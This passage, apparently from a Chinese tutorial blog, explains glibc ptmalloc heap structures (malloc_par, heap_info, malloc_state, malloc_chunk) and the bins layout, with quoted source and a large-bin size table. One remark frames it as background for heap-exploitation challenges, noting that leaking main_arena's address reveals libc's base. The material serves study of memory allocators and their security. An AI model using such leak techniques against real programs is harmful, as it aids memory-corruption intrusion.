<li><code>n_mmaps</code>：<code>mmap</code> 的内存数量，即 ptmalloc
每次成功 <code>mmap</code> 则 <code>n_mmaps</code> 加 1，ptmalloc
每次成功 <code>munmap</code> 则 <code>n_mmaps</code> 减 1 。</li>
<li><code>n_mmaps_max</code>：<code>n_mmaps</code> 的上限，即最多能
<code>mmap</code> 的内存数量。</li>
<li><code>max_n_mmaps</code>：<code>n_mmaps</code> 达到过的最大值。</li>
<li><code>mmapped_mem</code>：当前 <code>mmap</code>
的内存大小总和。</li>
<li><code>max_mmapped_mem</code>：<code>mmap</code>
的内存大小总和达到过的最大值。</li>
<li><code>sbrk_base</code>：表示通过 <code>brk</code> 系统调用申请的
<code>heap</code> 区域的起始地址。</li>
<li><code>no_dyn_threshold</code>：表示是否禁用 <code>heap</code>
动态调整保留内存的大小，默认为 0 。</li>
</ul>
<p>该结构体类型的实例 <code>mp_</code> 用以记录 ptmalloc
相关参数，同样定义于 <code>malloc.c</code> 中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> DEFAULT_TOP_PAD 131072 <span class="comment">// 0x20000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_MAX       (65536) <span class="comment">// 0x10000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN <span class="comment">// 0x20000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_TRIM_THRESHOLD (128 * 1024) <span class="comment">// 0x20000</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">malloc_par</span> mp_ =</span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = <span class="built_in">NARENAS_FROM_NCORES</span> (<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h2 id="heap_info">heap_info</h2>
<p><code>heap_info</code> 位于一个 <code>heap</code>
块的开头，用以记录通过 <code>mmap</code> 系统调用从 Memory Mapping
Segment 处申请到的内存块的信息。定义于 <code>arena.c</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>
<p><code>heap_info</code> 结构体的成员如下：</p>
<ul>
<li><code>ar_ptr</code>：指向管理该堆块的 arena</li>
<li><code>prev</code>：该heap_info所链接的上一个 heap_info</li>
<li><code>size</code>：记录该堆块的大小</li>
<li><code>mprotect_size</code>：记录该堆块中被保护（<code>mprotected</code>）的大小</li>
<li><code>pad</code>：即 <code>padding</code> ，用以在
<code>SIZE_SZ</code> 不正常的情况下进行填充以让内存对齐，正常情况下
<code>pad</code> 所占用空间应为 0 字节</li>
</ul>
<h2 id="arena">arena</h2>
<p>大部分情况下对于每个线程而言其都会单独有着一个 <code>arena</code>
实例用以管理属于该线程的堆内存区域。<code>ptmalloc</code>
内部的内存池结构是由 <code>malloc_state</code> 结构体进行定义的，即
<code>arena</code> 本身便为 <code>malloc_state</code> 的一个实例对象。
<code>malloc_state</code> 结构体定义于<code>malloc/malloc.c</code>
中，代码如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>malloc_state</code> 结构体的成员如下：</p>
<ul>
<li><code>mutex</code>：<code>mutex</code>
变量即为多线程互斥锁，用以保证线程安全。</li>
<li><code>flags</code>：标志位，用以表示 <code>arena</code>
的一些状态，如：是否有 <code>fastbin</code> 、内存是否连续等。</li>
<li><code>fastbinY</code>：存放 fastbin chunk 的数组。</li>
<li><code>top</code>：指向 Top Chunk 的指针。</li>
<li><code>last_remainder</code>：<code>chunk</code>
切割中的剩余部分。<code>malloc</code> 在分配 <code>chunk</code>
时若是没找到 <code>size</code> 合适的 <code>chunk</code> 而是找到了一个
<code>size</code> 更大的 <code>chunk</code> ，则会从大
<code>chunk</code> 中切割掉一块返回给用户，剩下的那一块便是
<code>last_remainder</code> ，其随后会被放入 unsorted bin 中。</li>
<li><code>bins</code>：存放闲置 <code>chunk</code>
的数组。<code>bins</code> 包括 large bin，small bin 和 unsorted bin
。</li>
<li><code>binmap</code>：记录 <code>bin</code> 是否为空的
<code>bitset</code> 。需要注意的是 <code>chunk</code> 被取出后若一个
<code>bin</code> 空了并不会立即被置 0
，而会在下一次遍历到时重新置位。</li>
<li><code>next</code>：指向下一个 <code>arena</code>
的指针。一个进程内所有的 <code>arena</code>
串成了一条循环单向链表，<code>malloc_state</code> 中的 <code>next</code>
指针便是用以指向下一个 <code>arena</code> ，方便后续的遍历
<code>arena</code> 的操作（因为不是所有的线程都有自己独立的
<code>arena</code> ）。</li>
<li><code>next_free</code>：指向下一个空闲的 <code>arena</code>
的指针。与 <code>next</code> 指针类似，只不过指向的是空闲的
<code>arena</code>（即没有被任一线程所占用）。</li>
<li><code>attached_threads</code>：与该 <code>arena</code>
相关联的线程数。该变量用以表示有多少个线程与该<code>arena</code>
相关联，这是因为 <code>aerna</code>
的数量是有限的，并非每一个线程都有机会分配到一个<code>arena</code>，在线程数量较大的情况下会存在着多个线程共用一个
<code>arena</code> 的情况。</li>
<li><code>system_mem</code>：记录当前 <code>arena</code>
在堆区中所分配到的内存的总大小。</li>
<li><code>max_system_mem</code>：当操作系统予进程以内存时，<code>system_mem</code>
会随之增大，当内存被返还给操作系统时，<code>sysyetm_mem</code>
会随之减小，<code>max_system_mem</code> 变量便是用来记录在这个过程当中
<code>system_mem</code> 的峰值。</li>
</ul>
<p><code>main_arena</code> 为一个定义于 <code>malloc.c</code> 中的静态的
<code>malloc_state</code> 结构体。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">malloc_state</span> main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>由于其为 libc 中的静态变量，该 <code>arena</code> 会被随着 libc
文件一同加载到 Memory Mapping Segment。因此在堆题中通常通过泄露
<code>arena</code> 的地址以获得 libc 在内存中的基地址。</p>
<h2 id="chunk">chunk</h2>
<p>在程序的执行过程中，我们称由 <code>malloc</code> 申请的内存为
<code>chunk</code> 。这块内存在 <code>ptmalloc</code> 内部用
<code>malloc_chunk</code> 结构体来表示。当程序申请的 <code>chunk</code>
被 <code>free</code> 后，会被加入到相应的空闲管理列表中。
<code>malloc_chunk</code> 定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>每个字段的具体的解释如下：</p>
<ul>
<li><p><code>prev_size</code>：如果物理相邻的前一地址 <code>chunk</code>
是空闲的话，那该字段记录的是前一个 <code>chunk</code> 的大小 (包括
<code>chunk</code> 头)。否则，该字段可以用来存储物理相邻的前一个
<code>chunk</code> 的数据。</p></li>
<li><p><code>size</code>：该 <code>chunk</code> 的大小，大小必须是
<code>2 * SIZE_SZ</code> 的整数倍。该字段的低三个比特位对
<code>chunk</code> 的大小没有影响，它们从高到低分别表示为：</p>
<ul>
<li><code>NON_MAIN_ARENA</code>，记录当前 <code>chunk</code>
是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li><code>IS_MAPPED</code>，记录当前 <code>chunk</code> 是否是由
<code>mmap</code> 分配的。</li>
<li><code>PREV_INUSE</code>，记录前一个 <code>chunk</code>
块是否被分配。一般来说，堆中第一个被分配的内存块的 <code>size</code>
字段的 <code>P</code> 位都会被设置为
1，以便于防止访问前面的非法内存。当一个 <code>chunk</code> 的
<code>size</code> 的 <code>P</code> 位为 0 时，我们能通过
<code>prev_size</code> 字段来获取上一个 <code>chunk</code>
的大小以及地址。这也方便进行空闲 <code>chunk</code> 之间的合并。</li>
</ul></li>
<li><p><code>fd</code>，<code>bk</code>。 <code>chunk</code>
处于分配状态时，从 <code>fd</code>
字段开始是用户的数据。<code>chunk</code>
空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p>
<ul>
<li><code>fd</code> 指向下一个（非物理相邻）空闲的
<code>chunk</code></li>
<li><code>bk</code> 指向上一个（非物理相邻）空闲的
<code>chunk</code></li>
</ul>
<p>通过 <code>fd</code> 和 <code>bk</code> 可以将空闲的
<code>chunk</code> 块加入到空闲的 <code>chunk</code>
块链表进行统一管理</p></li>
<li><p><code>fd_nextsize</code>， <code>bk_nextsize</code>，也是只有
<code>chunk</code> 空闲的时候才使用，不过其用于较大的
<code>chunk</code>（large chunk）。</p>
<ul>
<li><code>fd_nextsize</code> 指向前一个与当前 <code>chunk</code>
大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针。</li>
<li><code>bk_nextsize</code> 指向后一个与当前 <code>chunk</code>
大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 <code>fd</code>
的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适
<code>chunk</code> 时挨个遍历。（<del>好在 large bin
限制了值域范围，不然也会很慢</del> ）</li>
</ul></li>
</ul>
<p><code>chunk</code> 的结构如下图所示：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f439d9936936ea9634731a2829b84bcf.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<h2 id="bins">bins</h2>
<h2 id="bins-1">bins</h2>
<p>我们曾经说过，用户释放掉的 <code>chunk</code>
不会马上归还给系统，ptmalloc 会统一管理 <code>heap</code> 和
<code>mmap</code> 映射区域中的空闲的
<code>chunk</code>。当用户再一次请求分配内存时，<code>ptmalloc</code>
分配器会试图在空闲的 <code>chunk</code>
中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。
在具体的实现中，ptmalloc 采用分箱式方法对空闲的 <code>chunk</code>
进行管理。首先，它会根据空闲的 <code>chunk</code> 的大小以及使用状态将
<code>chunk</code> 初步分为 4 类：fast bins，small bins，large
bins，unsorted bin 。对于 libc2.26 以上版本还有 <code>tcache</code>
。</p>
<h3 id="概述">概述</h3>
<p>对于 small bins，large bins，unsorted bin 来说，ptmalloc
将它们维护在一个 <code>bins</code> 数组中。这些 <code>bin</code>
对应的数据结构在 <code>malloc_state</code> 中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure></div>
<p><code>bins</code> 数组实际上可以看做是以 <code>chunk</code>
为单位，只不过采用空间复用策略，因为实际用到的只有 <code>fd</code> 和
<code>bk</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d6b2cc483c3f8a156e4c445dc0e4797.png"
                     
alt="在这里插入图片描述" 
                > 由于是双链表结构 <code>bins</code>
数组每连续两个 <code>chunk</code> 指针维护一个 <code>bin</code>（即
<code>fd</code> 和 <code>bk</code> ），其结构如下图所示（64位）。其中
small bins 中 <code>chunk</code> 大小已给出。large bins 的每个
<code>bin</code> 中的 <code>chunk</code> 大小在一个范围内。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/08c0ec1b811090f35577a73cebba6a99.png"
                     
alt="在这里插入图片描述" 
                > large bin 的 <code>chunk</code>
范围如下：</p>
<table>
<colgroup>
<col style="width: 7%" />
<col style="width: 15%" />
<col style="width: 15%" />
<col style="width: 15%" />
<col style="width: 15%" />
<col style="width: 15%" />
<col style="width: 15%" />
</colgroup>
<thead>
<tr class="header">
<th>编号</th>
<th>64位最小</th>
<th>64位最大</th>
<th>64位公差</th>
<th>32位最小</th>
<th>32位最大</th>
<th>32位公差</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>64</td>
<td>0x400</td>
<td>0x430</td>
<td>0x40</td>
<td>0x200</td>
<td>0x238</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>65</td>
<td>0x440</td>
<td>0x470</td>
<td>0x40</td>
<td>0x240</td>
<td>0x278</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>66</td>
<td>0x480</td>
<td>0x4b0</td>
<td>0x40</td>
<td>0x280</td>
<td>0x2b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>67</td>
<td>0x4c0</td>
<td>0x4f0</td>
<td>0x40</td>
<td>0x2c0</td>
<td>0x2f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>68</td>
<td>0x500</td>
<td>0x530</td>
<td>0x40</td>
<td>0x300</td>
<td>0x338</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>69</td>
<td>0x540</td>
<td>0x570</td>
<td>0x40</td>
<td>0x340</td>
<td>0x378</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>70</td>
<td>0x580</td>
<td>0x5b0</td>
<td>0x40</td>
<td>0x380</td>
<td>0x3b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>71</td>
<td>0x5c0</td>
<td>0x5f0</td>
<td>0x40</td>
<td>0x3c0</td>
<td>0x3f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>72</td>
<td>0x600</td>
<td>0x630</td>
<td>0x40</td>
<td>0x400</td>
<td>0x438</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>73</td>
<td>0x640</td>
<td>0x670</td>
<td>0x40</td>
<td>0x440</td>
<td>0x478</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>74</td>
<td>0x680</td>
<td>0x6b0</td>
<td>0x40</td>
<td>0x480</td>
<td>0x4b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>75</td>
<td>0x6c0</td>
<td>0x6f0</td>
<td>0x40</td>
<td>0x4c0</td>
<td>0x4f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>76</td>
<td>0x700</td>
<td>0x730</td>
<td>0x40</td>
<td>0x500</td>
<td>0x538</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>77</td>
<td>0x740</td>
<td>0x770</td>
<td>0x40</td>
<td>0x540</td>
<td>0x578</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>78</td>
<td>0x780</td>
<td>0x7b0</td>
<td>0x40</td>
<td>0x580</td>
<td>0x5b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>79</td>
<td>0x7c0</td>
<td>0x7f0</td>
<td>0x40</td>
<td>0x5c0</td>
<td>0x5f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>80</td>
<td>0x800</td>
<td>0x830</td>
<td>0x40</td>
<td>0x600</td>
<td>0x638</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>81</td>
<td>0x840</td>
<td>0x870</td>
<td>0x40</td>
<td>0x640</td>
<td>0x678</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>82</td>
<td>0x880</td>
<td>0x8b0</td>
<td>0x40</td>
<td>0x680</td>
<td>0x6b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>83</td>
<td>0x8c0</td>
<td>0x8f0</td>
<td>0x40</td>
<td>0x6c0</td>
<td>0x6f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>84</td>
<td>0x900</td>
<td>0x930</td>
<td>0x40</td>
<td>0x700</td>
<td>0x738</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>85</td>
<td>0x940</td>
<td>0x970</td>
<td>0x40</td>
<td>0x740</td>
<td>0x778</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>86</td>
<td>0x980</td>
<td>0x9b0</td>
<td>0x40</td>
<td>0x780</td>
<td>0x7b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>87</td>
<td>0x9c0</td>
<td>0x9f0</td>
<td>0x40</td>
<td>0x7c0</td>
<td>0x7f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>88</td>
<td>0xa00</td>
<td>0xa30</td>
<td>0x40</td>
<td>0x800</td>
<td>0x838</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>89</td>
<td>0xa40</td>
<td>0xa70</td>
<td>0x40</td>
<td>0x840</td>
<td>0x878</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>90</td>
<td>0xa80</td>
<td>0xab0</td>
<td>0x40</td>
<td>0x880</td>
<td>0x8b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>91</td>
<td>0xac0</td>
<td>0xaf0</td>
<td>0x40</td>
<td>0x8c0</td>
<td>0x8f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>92</td>
<td>0xb00</td>
<td>0xb30</td>
<td>0x40</td>
<td>0x900</td>
<td>0x938</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>93</td>
<td>0xb40</td>
<td>0xb70</td>
<td>0x40</td>
<td>0x940</td>
<td>0x978</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>94</td>
<td>0xb80</td>
<td>0xbb0</td>
<td>0x40</td>
<td>0x980</td>
<td>0x9b8</td>
<td>0x40</td>
</tr>
<tr class="even">
<td>95</td>
<td>0xbc0</td>
<td>0xbf0</td>
<td>0x40</td>
<td>0x9c0</td>
<td>0x9f8</td>
<td>0x40</td>
</tr>
<tr class="odd">
<td>96</td>
<td>0xc00</td>
<td>0xc30</td>
<td>0x40</td>
<td>0xa00</td>
<td>0xbf8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>97</td>
<td>0xc40</td>
<td>0xdf0</td>
<td>0x1c0</td>
<td>0xc00</td>
<td>0xdf8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>98</td>
<td>0xe00</td>
<td>0xff0</td>
<td>0x200</td>
<td>0xe00</td>
<td>0xff8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>99</td>
<td>0x1000</td>
<td>0x11f0</td>
<td>0x200</td>
<td>0x1000</td>
<td>0x11f8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>100</td>
<td>0x1200</td>
<td>0x13f0</td>
<td>0x200</td>
<td>0x1200</td>
<td>0x13f8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>101</td>
<td>0x1400</td>
<td>0x15f0</td>
<td>0x200</td>
<td>0x1400</td>
<td>0x15f8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>102</td>
<td>0x1600</td>
<td>0x17f0</td>
<td>0x200</td>
<td>0x1600</td>
<td>0x17f8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>103</td>
<td>0x1800</td>
<td>0x19f0</td>
<td>0x200</td>
<td>0x1800</td>
<td>0x19f8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>104</td>
<td>0x1a00</td>
<td>0x1bf0</td>
<td>0x200</td>
<td>0x1a00</td>
<td>0x1bf8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>105</td>
<td>0x1c00</td>
<td>0x1df0</td>
<td>0x200</td>
<td>0x1c00</td>
<td>0x1df8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>106</td>
<td>0x1e00</td>
<td>0x1ff0</td>
<td>0x200</td>
<td>0x1e00</td>
<td>0x1ff8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>107</td>
<td>0x2000</td>
<td>0x21f0</td>
<td>0x200</td>
<td>0x2000</td>
<td>0x21f8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>108</td>
<td>0x2200</td>
<td>0x23f0</td>
<td>0x200</td>
<td>0x2200</td>
<td>0x23f8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>109</td>
<td>0x2400</td>
<td>0x25f0</td>
<td>0x200</td>
<td>0x2400</td>
<td>0x25f8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>110</td>
<td>0x2600</td>
<td>0x27f0</td>
<td>0x200</td>
<td>0x2600</td>
<td>0x27f8</td>
<td>0x200</td>
</tr>
<tr class="even">
<td>111</td>
<td>0x2800</td>
<td>0x29f0</td>
<td>0x200</td>
<td>0x2800</td>
<td>0x29f8</td>
<td>0x200</td>
</tr>
<tr class="odd">
<td>112</td>
<td>0x2a00</td>
<td>0x2ff0</td>
<td>0x600</td>
<td>0x2a00</td>
<td>0x2ff8</td>
<td>0x600</td>
</tr>
<tr class="even">
<td>113</td>
<td>0x3000</td>
<td>0x3ff0</td>
<td>0x1000</td>
<td>0x3000</td>
<td>0x3ff8</td>
<td>0x1000</td>
</tr>
<tr class="odd">
<td>114</td>
<td>0x4000</td>
<td>0x4ff0</td>
<td>0x1000</td>
<td>0x4000</td>
<td>0x4ff8</td>
<td>0x1000</td>
</tr>
<tr class="even">
<td>115</td>
<td>0x5000</td>
<td>0x5ff0</td>
<td>0x1000</td>
<td>0x5000</td>
<td>0x5ff8</td>
<td>0x1000</td>
</tr>
<tr class="odd">
<td>116</td>
<td>0x6000</td>
<td>0x6ff0</td>
<td>0x1000</td>
<td>0x6000</td>
<td>0x6ff8</td>
<td>0x1000</td>
</tr>
<tr class="even">
<td>117</td>
<td>0x7000</td>
<td>0x7ff0</td>
<td>0x1000</td>
<td>0x7000</td>
<td>0x7ff8</td>
<td>0x1000</td>
</tr>
<tr class="odd">
<td>118</td>
<td>0x8000</td>
<td>0x8ff0</td>
<td>0x1000</td>
<td>0x8000</td>
<td>0x8ff8</td>
<td>0x1000</td>
</tr>
<tr class="even">
<td>119</td>
<td>0x9000</td>
<td>0x9ff0</td>
<td>0x1000</td>
<td>0x9000</td>
<td>0x9ff8</td>
<td>0x1000</td>
</tr>
<tr class="odd">
<td>120</td>
<td>0xa000</td>
<td>0xfff0</td>
<td>0x6000</td>
<td>0xa000</td>
<td>0xfff8</td>
<td>0x6000</td>
</tr>
<tr class="even">
<td>121</td>
<td>0x10000</td>
<td>0x17ff0</td>
<td>0x8000</td>
<td>0x10000</td>
<td>0x17ff8</td>
<td>0x8000</td>
</tr>
<tr class="odd">
<td>122</td>
<td>0x18000</td>
<td>0x1fff0</td>
<td>0x8000</td>
<td>0x18000</td>
<td>0x1fff8</td>
<td>0x8000</td>
</tr>
<tr class="even">
<td>123</td>
<td>0x20000</td>
<td>0x27ff0</td>
<td>0x8000</td>
<td>0x20000</td>
<td>0x27ff8</td>
<td>0x8000</td>
</tr>
<tr class="odd">
<td>124</td>
<td>0x28000</td>
<td>0x3fff0</td>
<td>0x18000</td>
<td>0x28000</td>
<td>0x3fff8</td>
<td>0x18000</td>
</tr>
<tr class="even">
<td>125</td>
<td>0x40000</td>
<td>0x7fff0</td>
<td>0x40000</td>
<td>0x40000</td>
<td>0x7fff8</td>
<td>0x40000</td>
</tr>
<tr class="odd">
<td>126</td>
<td>0x80000</td>
<td>inf</td>
<td></td>
<td>0x80000</td>
<td>inf</td>
<td></td>
</tr>
</tbody>
</table>
<p>对于 fast bin ，在 <code>malloc_state</code> 又单独定义了一个
<code>fastbinsY</code> 的结构维护。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> *mfastbinptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This is in malloc_state.</span></span><br><span class="line"><span class="comment">    /* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>
<p>由于 fast bin 为单链表结构，因此数组中一个指针就可以维护一个
<code>bin</code> 。结构如图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2c72c332b07fc4f69047f8afdd7dff79.png"
                     
alt="在这里插入图片描述" 
                > ### Fast Bin
为了避免大部分时间花在了合并、分割以及中间检查的过程中影响效率，因此
ptmalloc 中专门设计了 fast bin。</p>
<p>fast bin 采用单链表形式，结构如下图所示：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4aab9d846457a48f637c2d5a244af954.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
